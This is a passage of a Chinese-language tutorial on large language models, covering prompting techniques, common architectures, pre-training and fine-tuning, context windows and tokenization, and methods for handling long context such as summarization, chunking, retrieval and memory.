情感:</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>思维链提示 (Chain-of-Thought Prompting):</strong> 对于需要复杂推理的任务，可以引导 LLM **逐步思考 (Step-by-step thinking)**。 在 Prompt 中要求模型解释它的思考过程，或者提供一些中间步骤的提示。 这可以显著提高 LLM 在推理任务上的表现。</p><ul><li><strong>例子：</strong> “问题：如果我有 3 个苹果和 2 个梨，我吃掉了一个苹果和一个梨，我还剩下多少水果？ 请一步一步思考，并给出最终答案。”</li></ul></li><li><p><strong>约束和限制 (Constraints and Boundaries):</strong> 在 Prompt 中明确指定一些约束条件，例如 “字数限制为 100 字以内”， “回答必须基于以下材料”， “不要包含个人信息” 等等。 这有助于控制模型输出的范围和内容。</p></li><li><p><strong>迭代优化 (Iterative Refinement):</strong> Prompt Engineering 是一个迭代的过程。 不要期望一次就能写出完美的 Prompt。 尝试不同的 Prompt，观察模型输出，分析结果，并根据需要进行调整和改进。 这是一个不断试错和优化的过程。</p></li><li><p><strong>负面提示 (Negative Prompting, 较少使用，但在某些场景下有用):</strong> 告诉模型 **不要做什么 (What not to do)**。 例如， “请写一篇关于人工智能的文章，但不要涉及深度学习算法。” 这在一些特定的内容控制场景下可能有</p></li></ul><h2><span id="大模型架构">大模型架构</span></h2><p><strong>Transformer架构及其变体 (Transformer &amp; Variants):</strong></p><ul><li><p><strong>核心思想:</strong> 基于自注意力机制 (Self-Attention Mechanism)，能够并行处理序列数据，有效捕捉长距离依赖关系。</p></li><li><p><strong>代表模型:</strong></p><ul><li><p><strong>BERT (Bidirectional Encoder Representations from Transformers):</strong> Encoder-only架构，擅长理解语言表示，用于文本分类、命名实体识别、问答等任务。</p></li><li><p><strong>GPT (Generative Pre-trained Transformer) 系列 (GPT-3, GPT-4等):</strong> Decoder-only架构，擅长生成文本，用于文本生成、对话、代码生成等任务。</p></li><li><p><strong>T5 (Text-to-Text Transfer Transformer):</strong> Encoder-Decoder架构，将所有NLP任务都转化为文本到文本的生成任务，通用性强。</p></li><li><p><strong>BART (Bidirectional and Auto-Regressive Transformer):</strong> Encoder-Decoder架构，结合了BERT的双向编码和GPT的自回归解码，擅长序列到序列的任务，如摘要、翻译等。</p></li><li><p><strong>Transformer-XL (Transformer with Extra Long Context):</strong> 改进了Transformer处理长序列的能力，通过引入循环机制和相对位置编码，能够处理更长的上下文。</p></li><li><p><strong>Longformer:</strong> 通过稀疏注意力机制 (Sparse Attention) 降低Transformer处理长序列的计算复杂度，提升效率。</p></li><li><p><strong>Big Bird:</strong> 结合全局注意力、窗口注意力和随机注意力，进一步优化长序列处理能力。</p></li><li><p><strong>Vision Transformer (ViT):</strong> 将Transformer应用于图像领域，将图像分割成Patch，作为序列输入Transformer进行处理，在图像分类等任务上取得了优秀成果。</p></li><li><p><strong>Swin Transformer:</strong> 引入滑动窗口注意力机制 (Shifted Window Attention)，在Vision Transformer基础上进一步提升了图像任务的性能，尤其在目标检测和语义分割等任务上表现出色。</p></li></ul></li><li><p><strong>特点:</strong></p><ul><li><p><strong>并行计算:</strong> 自注意力机制允许并行计算序列中不同位置的信息，加速训练和推理。</p></li><li><p><strong>长距离依赖:</strong> 自注意力机制能够直接捕捉序列中任意两个位置之间的依赖关系，有效处理长文本或长序列数据。</p></li><li><p><strong>可扩展性强:</strong> Transformer架构易于扩展到更大的模型规模，通过增加层数、注意力头数和隐藏层维度来提升模型容量。</p></li><li><p><strong>通用性:</strong> Transformer架构在自然语言处理、计算机视觉、语音识别等多个领域都取得了成功，展现了强大的通用性。</p></li></ul></li></ul><p><strong>2. 循环神经网络及其变体 (RNN &amp; Variants):</strong></p><ul><li><p><strong>核心思想:</strong> 通过循环结构处理序列数据，记忆之前的状态信息，适用于处理变长序列。</p></li><li><p><strong>代表模型:</strong></p><ul><li><p><strong>LSTM (Long Short-Term Memory Networks):</strong> 长短期记忆网络，通过引入门控机制 (Gate Mechanism) 解决了传统RNN的梯度消失和梯度爆炸问题，能够有效捕捉长期依赖。</p></li><li><p><strong>GRU (Gated Recurrent Unit):</strong> 门控循环单元，是LSTM的简化版本，在性能接近LSTM的同时，参数更少，计算效率更高。</p></li><li><p><strong>双向RNN (Bidirectional RNN):</strong> 能够同时利用序列的前向和后向信息，更全面地理解序列上下文。</p></li></ul></li><li><p><strong>特点:</strong></p><ul><li><p><strong>处理序列数据:</strong> 天然适合处理序列数据，如文本、语音、时间序列等。</p></li><li><p><strong>记忆能力:</strong> 循环结构使其能够记忆之前的状态信息，捕捉序列的动态变化。</p></li><li><p><strong>变长序列处理:</strong> 可以处理不同长度的输入序列。</p></li></ul></li><li><p><strong>局限性:</strong></p><ul><li><p><strong>串行计算:</strong> RNN的计算是串行的，难以并行化，训练和推理速度较慢。</p></li><li><p><strong>长距离依赖问题 (相对Transformer而言):</strong> 虽然LSTM和GRU缓解了梯度消失问题，但对于非常长的序列，仍然可能存在信息丢失或梯度衰减的问题，捕捉长距离依赖的能力相对Transformer较弱。</p></li></ul></li></ul><p><strong>3. 卷积神经网络及其变体 (CNN &amp; Variants):</strong></p><ul><li><p><strong>核心思想:</strong> 通过卷积核提取局部特征，适用于处理图像、音频等网格状数据。</p></li><li><p><strong>代表模型:</strong></p><ul><li><p><strong>ResNet (Residual Network):</strong> 残差网络，通过引入残差连接 (Residual Connection) 解决了深层网络训练困难的问题，可以训练非常深的CNN网络。</p></li><li><p><strong>EfficientNet:</strong> 高效网络，通过统一缩放网络深度、宽度和分辨率来优化网络性能和效率。</p></li><li><p><strong>ConvNeXt:</strong> 受Vision Transformer启发，对ResNet进行现代化改造，使其在图像分类等任务上性能接近甚至超过Vision Transformer。</p></li></ul></li><li><p><strong>特点:</strong></p><ul><li><p><strong>局部特征提取:</strong> 卷积核能够有效地提取局部特征，如边缘、纹理等。</p></li><li><p><strong>参数共享:</strong> 卷积核在整个输入上共享参数，减少了模型参数量。</p></li><li><p><strong>平移不变性:</strong> 卷积操作具有平移不变性，对于图像识别等任务非常有利。</p></li></ul></li><li><p><strong>局限性 (在处理长序列和全局依赖方面):</strong></p><ul><li><p><strong>捕捉长距离依赖能力弱 (相对Transformer而言):</strong> CNN主要关注局部特征，捕捉长距离依赖关系需要堆叠多层卷积，效率较低。</p></li><li><p><strong>不擅长处理序列数据 (直接使用时):</strong> 原始的CNN结构更适合处理网格状数据，直接应用于序列数据可能效果不如RNN或Transformer。</p></li></ul></li></ul><p><strong>4. 混合架构 (Hybrid Architectures):</strong></p><ul><li><p><strong>核心思想:</strong> 结合不同架构的优点，扬长避短，以适应更复杂的任务和场景。</p></li><li><p><strong>代表模型:</strong></p><ul><li><p><strong>Transformer-CNN混合架构:</strong> 例如将CNN作为Transformer的特征提取器，或者将Transformer用于处理CNN提取的特征，结合了CNN的局部特征提取能力和Transformer的全局依赖捕捉能力，常用于视觉和多模态任务。</p></li><li><p><strong>RNN-Transformer混合架构:</strong> 例如使用RNN处理序列的局部信息，再用Transformer处理全局信息，或者将Transformer的输出作为RNN的输入，结合了RNN的序列建模能力和Transformer的长距离依赖捕捉能力。</p></li><li><p><strong>MoE (Mixture of Experts) 架构:</strong> 并非独立的架构，而是一种模型扩展技术，可以将Transformer、CNN、RNN等作为专家模型，通过门控网络 (Gating Network) 动态选择不同的专家来处理不同的输入，提升模型容量和泛化能力。</p></li></ul></li><li><p><strong>特点:</strong></p><ul><li><p><strong>性能更强:</strong> 结合不同架构的优点，通常能取得比单一架构更好的性能。</p></li><li><p><strong>适应性更广:</strong> 能够适应更复杂的任务和场景。</p></li><li><p><strong>设计更复杂:</strong> 混合架构的设计通常更复杂，需要仔细权衡不同组件的优缺点。</p></li></ul></li></ul><p><strong>总结:</strong></p><ul><li><p><strong>Transformer架构及其变体</strong> 目前是AI大模型的主流架构，尤其在自然语言处理领域占据主导地位，并在计算机视觉等领域也取得了显著进展。</p></li><li><p><strong>RNN架构及其变体</strong> 在序列建模领域仍有应用价值，但在大规模模型中相对较少单独使用，更多的是作为混合架构的组件。</p></li><li><p><strong>CNN架构及其变体</strong> 在计算机视觉领域仍然至关重要，也常被用作混合架构的特征提取器。</p></li><li><p><strong>混合架构</strong> 是未来发展的重要趋势，能够结合不同架构的优势，构建更强大、更通用的AI模型。</p></li><li></li></ul><h1><span id="预训练模型与微调-pre-training-and-fine-tuning">预训练模型与微调 (Pre-training and Fine-tuning)</span></h1><p>可以把预训练和微调比作 <strong>教育过程</strong>。 预训练就像是 <strong>通识教育</strong>，打下广泛的基础，而微调则是 <strong>专业教育</strong>，针对特定领域进行深入学习。</p><p><strong>1. 预训练 (Pre-training) - 通识教育，打基础</strong></p><ul><li><p><strong>概念：</strong> 预训练是训练大语言模型 (LLM) 的 <strong>第一阶段</strong>，也是最耗时和资源最多的阶段。 在这个阶段，模型会在 <strong>海量的通用文本数据</strong> 上进行训练，例如：</p><ul><li><p>互联网上的网页文本 (Common Crawl)</p></li><li><p>书籍 (Books3)</p></li><li><p>维基百科 (Wikipedia)</p></li><li><p>新闻文章</p></li><li><p>代码库 (GitHub 代码)</p></li><li><p>等等</p></li></ul><p>这些数据涵盖了各种主题、风格和语言形式，旨在让模型尽可能地 <strong>学习到通用的语言知识和世界知识</strong>。</p></li><li><p><strong>目标：</strong> 预训练的目标是让模型 <strong>掌握语言的基本规律</strong>，例如：</p><ul><li><p><strong>语法规则：</strong> 如何正确地组织句子，词语之间的搭配关系。</p></li><li><p><strong>语义信息：</strong> 词语和句子的含义，上下文的理解。</p></li><li><p><strong>世界知识：</strong> 关于世界的常识，例如 “巴黎是法国的首都”， “苹果是一种水果” 等等。</p></li><li><p><strong>语言风格和模式：</strong> 不同类型的文本 (例如新闻、小说、代码) 的特点。</p></li></ul><p><strong>预训练的最终产物就是一个 “预训练模型” (Pre-trained Model)。</strong> 这个模型已经具备了 <strong>初步的语言理解和生成能力</strong>，但它还 <strong>不擅长执行特定的任务</strong>，例如情感分析、机器翻译、问答等。 它更像是一个 <strong>通才</strong>，什么都会一点，但都不精。</p></li><li><p><strong>预训练任务：</strong> 为了让模型学习到上述语言知识，预训练阶段通常会设计一些 <strong>自监督学习 (Self-supervised Learning) 任务</strong>。 这意味着训练数据本身就包含了标签，无需人工标注。 常见的预训练任务包括：</p><ul><li><p><strong>掩码语言模型 (Masked Language Modeling, MLM):</strong> (例如 BERT 使用的任务)</p><ul><li><p><strong>原理：</strong> 随机遮盖输入文本中的一部分词语 (例如用 [MASK] 替换)，然后让模型 <strong>预测被遮盖的词语</strong>。</p></li><li><p><strong>作用：</strong> 迫使模型理解上下文信息，学习词语之间的关系，从而掌握双向的语言表示能力。</p></li><li><p><strong>例子：</strong> 输入: “The capital of France is [MASK].” 目标: 预测 [MASK] 为 “Paris”。</p></li></ul></li><li><p><strong>因果语言模型 (Causal Language Modeling, CLM):</strong> (例如 GPT 系列使用的主任务)</p><ul><li><p><strong>原理：</strong> 给定一段文本的前面部分，让模型 <strong>预测下一个词语</strong>。 模型需要根据已有的上下文，逐词生成后续的文本。</p></li><li><p><strong>作用：</strong> 让模型学习生成连贯、流畅的文本，掌握单向的语言生成能力。</p></li><li><p><strong>例子：</strong> 输入: “The capital of France is “ 目标: 预测下一个词为 “Paris”。 然后再预测 “Paris” 之后的下一个词，以此类推。</p></li></ul></li><li><p>还有一些其他的预训练任务，例如 <strong>下一句预测 (Next Sentence Prediction, NSP)</strong> (BERT 早期使用，后来发现效果不明显)， <strong>对比学习 (Contrastive Learning)</strong> 等等。</p></li></ul></li></ul><p><strong>2. 微调 (Fine-tuning) - 专业教育，精专领域</strong></p><ul><li><p><strong>概念：</strong> 微调是训练 LLM 的 <strong>第二阶段</strong>，也是 <strong>任务适配阶段</strong>。 在预训练之后，如果我们想要让 LLM 在 <strong>特定的任务或领域</strong> 上表现出色，就需要进行微调。</p></li><li><p><strong>目标：</strong> 微调的目标是让 <strong>预训练模型适应特定的下游任务</strong>，例如：</p><ul><li><p><strong>情感分析：</strong> 判断文本的情感倾向 (正面、负面、中性)。</p></li><li><p><strong>机器翻译：</strong> 将文本从一种语言翻译成另一种语言。</p></li><li><p><strong>问答系统：</strong> 回答用户提出的问题。</p></li><li><p><strong>文本摘要：</strong> 将长文本压缩成简短的摘要。</p></li><li><p><strong>对话生成：</strong> 生成与用户进行对话的回复。</p></li><li><p><strong>代码生成：</strong> 根据自然语言描述生成代码。</p></li><li><p>等等，各种各样的 NLP 任务。</p></li></ul><p><strong>微调的产物就是一个 “微调模型” (Fine-tuned Model)。</strong> 这个模型在 <strong>特定任务上表现更优秀</strong>，但它的通用性可能会有所降低，因为它更专注于特定领域的知识和技能。 它更像是一个 <strong>专才</strong>，在特定领域非常精通。</p></li><li><p><strong>微调数据：</strong> 微调需要使用 <strong>特定任务的标注数据</strong>。 例如，如果要做情感分析，就需要情感标注的数据集 (文本 + 情感标签)。 如果要做机器翻译，就需要平行语料库 (源语言文本 + 目标语言文本)。 <strong>微调数据量通常比预训练数据量小得多，但质量要求更高，需要与目标任务高度相关。</strong></p></li><li><p><strong>微调方法：</strong> 微调通常是在 <strong>预训练模型的基础上</strong> 进行的。 具体步骤如下：</p><ol><li><p><strong>选择预训练模型：</strong> 选择一个与目标任务相关的预训练模型作为基础模型。</p></li><li><p><strong>准备微调数据：</strong> 准备特定任务的标注数据集。</p></li><li><p><strong>修改模型结构 (可选)：</strong> 根据任务需求，可能需要在预训练模型的基础上添加一些额外的层或修改模型的输出层。</p></li><li><p><strong>训练模型：</strong> 使用微调数据，<strong>继续训练预训练模型</strong>。 但通常会 <strong>降低学习率</strong>，并 <strong>只训练模型的一部分参数</strong> (例如只微调最后的几层)，以避免过度修改预训练模型学到的通用知识。</p></li><li><p><strong>评估模型：</strong> 在验证集或测试集上评估微调模型的性能，并进行调优。</p></li></ol></li><li><p><strong>为什么需要微调？</strong></p><ul><li><p><strong>提高任务性能：</strong> 预训练模型虽然具备通用语言能力，但在特定任务上可能表现不够出色。 微调可以使模型更好地适应特定任务的需求，显著提高任务性能。</p></li><li><p><strong>任务定制化：</strong> 不同的任务需要模型学习不同的知识和技能。 微调可以将预训练模型 “塑造成” 适用于特定任务的模型。</p></li><li><p><strong>降低数据需求：</strong> 相比于从头开始训练模型，微调只需要少量特定任务的数据就能取得不错的效果。 这大大降低了数据和计算资源的成本。</p></li></ul></li></ul><p><strong>3. 预训练 vs 微调 的关系总结</strong></p><ul><li><p><strong>预训练是基础，微调是应用。</strong> 预训练提供了一个强大的语言模型骨架，微调则是在这个骨架上构建各种应用。</p></li><li><p><strong>预训练关注通用性，微调关注特定性。</strong> 预训练学习通用语言知识，微调学习特定任务的技能。</p></li><li><p><strong>预训练数据量大，微调数据量小但质量高。</strong> 预训练需要海量通用数据，微调需要少量高质量的特定任务数据。</p></li><li><p><strong>预训练耗时耗资源，微调相对快速经济。</strong> 预训练需要大量的计算资源和时间，微调则相对经济高效。</p></li></ul><h1><span id="什么是-context-window-上下文窗口">什么是 Context Window (上下文窗口)</span></h1><ul><li><p><strong>核心定义:</strong> Context Window，中文通常翻译为 <strong>上下文窗口</strong> 或 <strong>语境窗口</strong>，是指 <strong>大语言模型 (LLM) 在一次处理过程中，能够考虑的最大文本长度</strong>。 这个长度是以 <strong>token 数量</strong> 来衡量的，而不是字符数或单词数。</p></li><li><p><strong>形象比喻:</strong> 你可以把 Context Window 想象成：</p><ul><li><p><strong>人的短期记忆：</strong> 我们人类的短期记忆容量是有限的，只能记住最近发生的事情。 Context Window 就像是 LLM 的 “短期记忆”，它只能记住最近输入的文本片段。</p></li><li><p><strong>对话时的语境范围：</strong> 在对话中，我们理解当前对话内容，也依赖于之前的对话历史。 Context Window 决定了 LLM 在生成回复时，能够回顾和利用的对话历史的长度。</p></li><li><p><strong>书签标记的阅读范围：</strong> 如果你正在阅读一本书，Context Window 就好比你在书页上用书签标记的一段范围。 LLM 在处理当前位置时，只能 “看到” 书签标记范围内的内容，而无法直接访问书签之外的内容。</p></li></ul></li></ul><h1><span id="为什么-context-window-有长度限制">为什么 Context Window 有长度限制？</span></h1><p>Context Window 的长度限制，主要源于 Transformer 架构的 <strong>自注意力机制 (Self-Attention)</strong> 的 <strong>计算复杂性</strong> 和 <strong>硬件资源的限制</strong>。</p><ul><li><p><strong>自注意力机制的计算复杂度:</strong> Transformer 的自注意力机制，其计算复杂度与输入序列长度 (token 数量) 的 <strong>平方</strong> 成正比，即 **O(L^2)**，其中 L 是序列长度。</p><ul><li><p>这意味着，如果序列长度增加一倍，自注意力计算量会增加到原来的 <strong>四倍</strong>。</p></li><li><p>当序列长度非常长时，自注意力计算会变得非常 <strong>耗时</strong> 且 <strong>占用大量内存</strong> (显存)。</p></li></ul></li><li><p><strong>硬件资源的限制:</strong> 训练和运行 LLM 需要强大的计算资源 (GPU/TPU) 和内存 (显存)。 Context Window 越大，模型需要的计算资源和内存也越多。 受到硬件资源的限制，Context Window 的长度不可能无限增大。</p></li><li><p><strong>训练效率和推理效率的权衡:</strong> 为了保证 LLM 的 <strong>训练效率</strong> 和 <strong>推理效率</strong>，需要对 Context Window 的长度进行限制。 过大的 Context Window 会显著降低模型的训练和推理速度，甚至导致模型无法在有限的硬件资源下运行。</p></li></ul><h1><span id="context-window-的单位-token-词元">Context Window 的单位： Token (词元)</span></h1><ul><li><p><strong>重要概念：Tokenization (分词):</strong> 再次强调，Context Window 的长度是以 <strong>token 数量</strong> 来衡量的，而不是字符数或单词数。 这是因为 LLM 处理文本时，首先需要将文本 <strong>tokenize (分词)</strong> 成一个个的 **token (词元)**。</p></li><li><p><strong>Token 的种类:</strong> Token 可以是单词、子词 (subword) 或字符，取决于具体的 Tokenization 算法 (例如 BPE, WordPiece, SentencePiece)。 例如，英文单词 “unbelievable” 可能被 tokenize 成 [“un”, “believ”, “able”] 三个 token。</p></li><li><p><strong>不同语言的 Token 数量:</strong> 对于相同的文本内容，不同的语言，甚至不同的 Tokenizer，tokenize 后的 token 数量可能会有所不同。 通常来说，英文等空格分隔的语言，平均一个单词约等于 1.3-1.5 个 token。 中文、日文等非空格分隔的语言，tokenization 的方式更复杂，token 与单词的对应关系更不直接。</p></li><li><p><strong>理解 Tokenization 的重要性:</strong> 理解 Tokenization 对于准确预估文本的 token 数量，以及合理利用 Context Window 非常重要。 可以使用在线的 Tokenizer 工具 (例如 OpenAI Tokenizer) 来计算文本的 token 数量。</p></li></ul><p><strong>4. Context Window 的大小范围 (不断增长)</strong></p><ul><li><p><strong>早期 LLM:</strong> 早期的 LLM (例如 GPT-2, GPT-3) 的 Context Window 长度通常在 <strong>几百到几千个 token</strong> 左右 (例如 512, 1024, 2048, 4096 tokens)。</p></li><li><p><strong>近年来 LLM 的发展:</strong> 随着技术的进步，特别是 Transformer 架构的优化和硬件的提升，<strong>Context Window 的长度正在迅速增长</strong>。 新的 LLM (例如 GPT-4, Claude 2, Claude 3, Llama 2, Llama 3, 一些开源模型) 的 Context Window 可以达到 <strong>数万甚至数十万 token</strong> (例如 8k, 16k, 32k, 100k, 200k tokens)。</p></li><li><p><strong>Context Window 长度的未来趋势:</strong> <strong>增大 Context Window 长度是 LLM 发展的重要趋势之一</strong>。 更大的 Context Window 将使 LLM 能够处理更复杂的任务，理解更长篇的上下文，并实现更丰富的应用场景。 但同时，也需要解决计算效率和资源消耗的问题。</p></li></ul><h1><span id="context-window-的影响-重要性">Context Window 的影响 (重要性)</span></h1><p>Context Window 的大小直接影响了 LLM 的能力和应用范围：</p><ul><li><p><strong>长文本处理能力:</strong> Context Window 越大，LLM 可以处理的文本长度越长。 例如，可以处理更长的文档、书籍、代码库、对话记录等。 对于需要理解长篇上下文的任务 (例如长文档问答、长篇故事续写、代码理解)，更大的 Context Window 至关重要。</p></li><li><p><strong>上下文理解范围:</strong> Context Window 限制了 LLM 在生成回复时能够考虑的上下文范围。 如果对话历史、文档内容超出了 Context Window，模型可能会 “忘记” 之前的上下文信息，导致回答不准确、对话不连贯、信息丢失等问题。</p></li><li><p><strong>复杂推理能力:</strong> 对于需要复杂推理的任务 (例如多步推理、跨文档推理、长程依赖推理)，更大的 Context Window 可以提供更多的上下文信息，帮助模型进行更深入、更准确的思考和推理。</p></li><li><p><strong>记忆能力 (对话系统):</strong> 在对话系统中，Context Window 决定了模型的 “对话记忆” 能力。 更大的 Context Window 可以让对话机器人记住更长时间的对话历史，实现更连贯、更自然的对话体验。</p></li><li><p><strong>应用场景拓展:</strong> 更大的 Context Window 为 LLM 开辟了更广阔的应用场景，例如：</p><ul><li><p><strong>长文档分析和问答:</strong> 处理法律文档、研究报告、技术手册等长篇文档。</p></li><li><p><strong>大规模代码库分析和生成:</strong> 理解和生成更复杂的代码。</p></li><li><p><strong>长篇故事创作和续写:</strong> 创作更复杂、更连贯的故事。</p></li><li><p><strong>多轮对话和复杂对话流程:</strong> 实现更自然、更流畅的多轮对话。</p></li></ul></li></ul><h1><span id="如何处理长上下文-超过-context-window-限制">如何处理长上下文 (超过 Context Window 限制)</span></h1><p>即使 Context Window 在不断增大，但它仍然是一个有限的资源。 当我们需要处理超过 Context Window 长度的文本时，就需要采取一些策略来应对。 以下是一些常用的方法，并结合易懂的示例进行说明：</p><p><strong>1. 文本摘要 (Summarization)</strong></p><ul><li><p><strong>策略:</strong> 将长文本 <strong>压缩成更短的摘要</strong>，只保留关键信息，然后将摘要输入到 LLM 中。 这样可以显著缩减文本长度，使其符合 Context Window 的限制。</p></li><li><p><strong>适用场景:</strong> 适用于需要处理长文档、长文章、书籍等场景，例如：</p><ul><li><p><strong>长文档问答：</strong> 先对长文档进行摘要，然后基于摘要进行问答。</p></li><li><p><strong>信息检索：</strong> 对检索结果进行摘要，快速了解文档内容。</p></li><li><p><strong>会议纪要生成：</strong> 对会议录音或记录进行摘要，提取会议要点。</p></li></ul></li><li><p><strong>示例:</strong></p><p><strong>原始长文本 (例如一篇长篇新闻报道):</strong> 假设是一篇关于 “某地发生特大洪水灾害” 的详细报道，内容包括灾害发生的时间、地点、原因、受灾情况、救援进展、后续重建计划等等，token 数量超过 10000。</p><p><strong>摘要后的文本:</strong> 使用摘要算法 (可以是传统的摘要算法，也可以使用 LLM 本身进行摘要) 将长篇报道压缩成一段摘要，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某地遭遇百年不遇特大洪水，造成严重人员伤亡和财产损失。洪水于 [时间] 爆发，原因是 [原因]。受灾最严重的地区包括 [地区1], [地区2], [地区3]。目前救援工作正在紧张进行中，已转移安置 [人数] 灾民。政府已启动紧急响应，并制定灾后重建计划。</span><br></pre></td></tr></table></figure><p>摘要后的文本，token 数量可能只有几百，远远小于原始文本，可以轻松放入 Context Window。 然后，我们可以基于摘要后的文本，向 LLM 提问，例如： “这次洪水的主要原因是什么？”, “受灾最严重的地区有哪些？”, “政府的重建计划是什么？”</p></li><li><p><strong>优点:</strong> 简单直接，有效缩减文本长度。</p></li><li><p><strong>缺点:</strong> 摘要过程可能会丢失一些细节信息，摘要质量会影响后续任务的效果。</p></li></ul><p><strong>2. 文本分块/分段 (Chunking/Segmentation)</strong></p><ul><li><p><strong>策略:</strong> 将长文本 <strong>分割成多个较小的段落或块 (chunks)**，每个块的长度都控制在 Context Window 限制之内。 然后，可以 **逐个处理每个块</strong>，或者 <strong>结合多个块的信息</strong> 进行处理。</p></li><li><p><strong>适用场景:</strong> 适用于需要处理结构化长文本的场景，例如：</p><ul><li><p><strong>长文档问答：</strong> 将文档分割成段落，对每个段落进行索引，然后根据问题检索相关段落进行问答。</p></li><li><p><strong>长篇故事续写：</strong> 将故事分割成章节，每次只输入前几个章节，让 LLM 续写下一个章节。</p></li><li><p><strong>代码库分析：</strong> 将代码库分割成文件或函数，分别分析每个文件或函数。</p></li></ul></li><li><p><strong>分块方法:</strong></p><ul><li><p><strong>固定大小分块 (Fixed-size Chunking):</strong> 按照固定的 token 数量或字符数量进行分块，例如每 500 个 token 分成一块。 简单直接，但可能破坏语义完整性。</p></li><li><p><strong>语义分块 (Semantic Chunking):</strong> 根据文本的语义结构进行分块，例如按照段落、章节、句子等进行分割。 可以更好地保留语义完整性，但分块大小可能不均匀。</p></li><li><p><strong>滑动窗口分块 (Sliding Window Chunking):</strong> 使用滑动窗口在文本上滑动，每次取窗口内的文本作为一个块。 可以保证块之间的上下文连续性，但可能存在信息冗余。</p></li></ul></li><li><p><strong>示例 (长文档问答):</strong></p><p><strong>原始长文档 (例如一篇长篇技术文档):</strong> 假设是一篇关于 “深度学习模型优化技巧” 的技术文档，内容分为多个章节，例如 “模型初始化”, “学习率调整”, “正则化方法”, “优化器选择” 等等，总 token 数量超过 20000。</p><p><strong>文本分块:</strong> 将文档按照章节进行分割，每个章节作为一个 chunk。 例如：</p><ul><li><p>Chunk 1: “模型初始化” 章节内容 (token 数量 &lt; 4000)</p></li><li><p>Chunk 2: “学习率调整” 章节内容 (token 数量 &lt; 4000)</p></li><li><p>Chunk 3: “正则化方法” 章节内容 (token 数量 &lt; 4000)</p></li><li><p>Chunk 4: “优化器选择” 章节内容 (token 数量 &lt; 4000)</p></li><li><p>…</p></li></ul></li></ul><p><strong>处理方式:</strong></p><ul><li><p><strong>基于块的问答:</strong> 当用户提问 “如何选择合适的优化器？”，可以先检索到 “优化器选择” 章节 (Chunk 4)，然后只将 Chunk 4 输入到 LLM 中进行问答。</p></li><li><p><strong>跨块信息整合:</strong> 如果问题需要跨多个章节的信息，可以分别对相关 chunk 进行处理，然后将多个 chunk 的输出结果进行整合，得到最终答案。</p></li><li><p><strong>优点:</strong> 可以处理结构化长文本，保留更多细节信息，可以针对特定 chunk 进行处理。</p></li><li><p><strong>缺点:</strong> 需要考虑如何分块，以及如何整合多个块的信息。 块之间的上下文信息可能丢失。</p></li></ul><p><strong>3. 信息检索 (Information Retrieval)</strong></p><ul><li><p><strong>策略:</strong> 对于知识密集型任务 (例如问答系统)， <strong>不直接将整个长文档输入到 LLM 中，而是先从海量文档中检索出与问题最相关的文档片段 (或段落)**，然后 **只将检索到的相关片段与问题一起输入到 LLM 中</strong> 进行处理。 这可以大大减少输入文本的长度，并提高回答的准确性。</p></li><li><p><strong>适用场景:</strong> 适用于知识库问答、搜索引擎、文档检索等场景，例如：</p><ul><li><p><strong>构建企业知识库问答系统:</strong> 用户提问时，先从企业知识库中检索相关文档，然后基于检索到的文档回答问题。</p></li><li><p><strong>搜索引擎增强问答:</strong> 用户在搜索引擎中提问时，先检索相关网页，然后基于网页内容回答问题。</p></li><li><p><strong>法律咨询、医学咨询等专业领域问答:</strong> 从法律法规库、医学文献库等专业知识库中检索相关信息，辅助回答问题。</p></li></ul></li><li><p><strong>信息检索技术:</strong> 可以使用传统的文本检索技术 (例如 TF-IDF, BM25)，也可以使用基于向量相似度的语义检索技术 (例如使用 Sentence Embeddings, 向量数据库)。</p></li><li><p><strong>示例 (知识库问答):</strong></p><p><strong>海量知识库文档:</strong> 假设有一个企业内部知识库，包含大量的文档 (例如产品手册、FAQ 文档、内部 Wiki 等)，总 token 数量可能非常庞大，远远超出 Context Window 限制。</p><p><strong>信息检索流程:</strong></p><ol><li><p><strong>用户提问:</strong> 例如 “如何设置打印机的无线网络连接？”</p></li><li><p><strong>知识库检索:</strong> 使用信息检索算法，在知识库文档中检索出与问题最相关的文档片段 (例如 “打印机无线网络连接设置指南” 文档中的相关段落)。</p></li><li><p><strong>构建 Prompt:</strong> 将用户问题和检索到的相关文档片段一起构建成 Prompt，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请根据以下文档片段回答问题:</span><br><span class="line"></span><br><span class="line">文档片段:</span><br><span class="line">[检索到的 &quot;打印机无线网络连接设置指南&quot; 文档中的相关段落]</span><br><span class="line"></span><br><span class="line">问题: 如何设置打印机的无线网络连接？</span><br><span class="line">答案:</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol start="4"><li><strong>LLM 回答:</strong> 将 Prompt 发送给 LLM，模型基于提供的文档片段生成答案。</li></ol><ul><li><p><strong>优点:</strong> 可以处理海量知识库，只处理相关信息，提高效率和准确性。 可以有效缓解 Context Window 限制。</p></li><li><p><strong>缺点:</strong> 检索算法的准确性会影响最终效果，需要维护知识库和检索系统。</p></li></ul><p><strong>4. 记忆机制 (Memory Mechanisms, 主要用于对话系统)</strong></p><ul><li><p><strong>策略:</strong> 对于对话系统，可以使用 <strong>外部记忆模块</strong> (例如向量数据库、键值存储) 来 <strong>存储和检索对话历史</strong>，突破 Context Window 的限制，实现更长程的对话记忆。</p></li><li><p><strong>适用场景:</strong> 主要用于对话系统、聊天机器人等需要维护对话历史的场景。</p></li><li><p><strong>记忆模块类型:</strong></p><ul><li><p><strong>简单记忆 (Simple Memory):</strong> 只存储最近几轮对话的历史记录 (例如最近 5 轮对话)，超出部分就丢弃。 简单易实现，但记忆能力有限。</p></li><li><p><strong>总结记忆 (Summary Memory):</strong> 定期对对话历史进行摘要，将摘要信息存储起来。 可以压缩对话历史，但摘要质量会影响记忆效果。</p></li><li><p><strong>向量记忆 (Vector Memory):</strong> 将对话历史 (例如每轮对话的 utterance) 编码成向量表示，存储到向量数据库中。 可以进行语义检索，找到与当前对话最相关的历史信息。 LangChain 等框架提供了多种向量记忆模块的实现。</p></li></ul></li><li><p><strong>示例 (对话系统):</strong></p><p><strong>对话历史 (多轮对话):</strong> 假设用户和聊天机器人进行了多轮对话，对话历史已经很长，超出了 Context Window 限制。</p><p><strong>向量记忆机制:</strong></p><ol><li><p><strong>对话轮次编码:</strong> 将每一轮对话 (用户 utterance 和机器人 response) 编码成向量表示。</p></li><li><p><strong>向量存储:</strong> 